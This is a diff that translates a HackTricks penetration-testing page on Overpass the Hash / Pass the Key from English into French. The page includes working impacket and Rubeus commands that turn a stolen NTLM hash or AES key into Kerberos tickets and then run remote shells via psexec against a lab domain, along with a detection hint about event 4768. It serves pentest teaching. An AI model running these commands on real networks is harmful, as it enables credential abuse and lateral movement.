@@ -1,53 +1,33 @@
-# Over Pass the Hash/Pass the Key
+## Overpasser le Hash/Passer la Clé (PTK)
 
-<details>
+Cette attaque vise à **utiliser le hash NTLM ou les clés AES de l'utilisateur pour demander des tickets Kerberos**, en alternative à la méthode courante Pass The Hash sur le protocole NTLM. Par conséquent, cela pourrait être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et où seul **Kerberos est autorisé** en tant que protocole d'authentification.
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
-
-</details>
-
-## Overpass The Hash/Pass The Key (PTK)
-
-This attack aims to **use the user NTLM hash or AES keys to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.
-
-In order to perform this attack, the **NTLM hash (or password) of the target user account is needed**. Thus, once a user hash is obtained, a TGT can be requested for that account. Finally, it is possible to **access** any service or machine **where the user account has permissions**.
-
+Pour effectuer cette attaque, le **hash NTLM (ou le mot de passe) du compte utilisateur cible est nécessaire**. Ainsi, une fois qu'un hash utilisateur est obtenu, un TGT peut être demandé pour ce compte. Enfin, il est possible d'**accéder** à n'importe quel service ou machine **où le compte utilisateur a des autorisations**.
 ```
 python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
 export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
+Vous pouvez **spécifier** `-aesKey [clé AES]` pour spécifier l'utilisation de **AES256**.\
+Vous pouvez également utiliser le ticket avec d'autres outils tels que : smbexec.py ou wmiexec.py
 
-You can **specify** `-aesKey [AES key]` to specify to use **AES256**.\
-You can also use the ticket with other tools like: as smbexec.py or wmiexec.py
+Problèmes possibles :
 
-Possible problems:
-
-* _PyAsn1Error(‘NamedTypes can cast only scalar values’,)_ : Resolved by updating impacket to the lastest version.
-* _KDC can’t found the name_ : Resolved by using the hostname instead of the IP address, because it was not recognized by Kerberos KDC.
-
+* _PyAsn1Error(‘NamedTypes can cast only scalar values’,)_ : Résolu en mettant à jour impacket vers la dernière version.
+* _KDC can’t found the name_ : Résolu en utilisant le nom d'hôte au lieu de l'adresse IP, car elle n'était pas reconnue par Kerberos KDC.
 ```
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 ```
-
-This kind of attack is similar to **Pass the Key**, but instead of using hashes to request for a ticket, the ticket itself is stolen and used to authenticate as its owner.
+Ce type d'attaque est similaire à **Pass the Key**, mais au lieu d'utiliser des hachages pour demander un ticket, le ticket lui-même est volé et utilisé pour s'authentifier en tant que propriétaire.
 
 {% hint style="warning" %}
-When a TGT is requested, event `4768: A Kerberos authentication ticket (TGT) was requested` is generated. You can see from the output above that the KeyType is **RC4-HMAC** (0x17), but the default type for Windows is now **AES256** (0x12).
+Lorsqu'un TGT est demandé, l'événement `4768: A Kerberos authentication ticket (TGT) was requested` est généré. Vous pouvez voir dans la sortie ci-dessus que le type de clé est **RC4-HMAC** (0x17), mais le type par défaut pour Windows est maintenant **AES256** (0x12).
 {% endhint %}
-
 ```bash
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
 ```
-
-## References
+## Références
 
 * [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
 
@@ -55,10 +35,10 @@ When a TGT is requested, event `4768: A Kerberos authentication ticket (TGT) was
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
